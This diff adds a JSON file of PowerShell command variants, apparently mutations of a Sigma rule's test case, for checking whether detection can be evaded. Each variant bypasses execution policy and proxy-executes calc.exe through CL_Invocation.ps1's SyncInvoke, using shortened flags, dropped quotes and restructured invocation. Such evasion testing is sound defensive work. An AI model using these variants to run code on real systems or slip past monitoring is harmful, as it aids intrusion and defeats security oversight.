@@ -1,0 +1,34 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; Get-Item Function:\\$method | ForEach-Object { & $_ 'calc.exe' ' ' }\"",
+    "explanation": "This is the original true positive command and is not a bypass, but rather a valid test case for the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -ep Bypass -c \"Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; Get-Item Function:\\$method | ForEach-Object { & $_ 'calc.exe' ' ' }\"",
+    "explanation": "Substitution of '-ExecutionPolicy' with '-ep' and '-Command' with '-c' as equivalent short options."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module CL_Invocation.ps1; $method = 'SyncInvoke'; Get-Item Function:\\$method | ForEach-Object { & $_ 'calc.exe' ' ' }\"",
+    "explanation": "Omission of quotes around the module name 'CL_Invocation.ps1' where acceptable by the parser."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; & (Get-Item Function:\\$method) 'calc.exe' ' '\"",
+    "explanation": "Reordering and simplification of the command by replacing 'Get-Item Function:\\$method | ForEach-Object { & $_ ... }' with direct invocation using '& (Get-Item Function:\\$method)'."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; & $method 'calc.exe' ' '\"",
+    "explanation": "Reordering and simplification by directly invoking the function using the variable $method without using 'Get-Item' and 'ForEach-Object'."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; & $method calc.exe ' '\"",
+    "explanation": "Omission of quotes around 'calc.exe' where acceptable by the parser."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module 'CL_Invocation.ps1'; $method = 'SyncInvoke'; & $method 'calc.exe' ' '\"",
+    "explanation": "Reordering and simplification by combining the string 'Sync' + 'Invoke' into a single string 'SyncInvoke'."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module 'CL_Invocation.ps1'; $method = 'SyncInvoke'; & $method calc.exe ' '\"",
+    "explanation": "Combination of multiple safe mutations including substitution, omission, and reordering."
+  }
+]
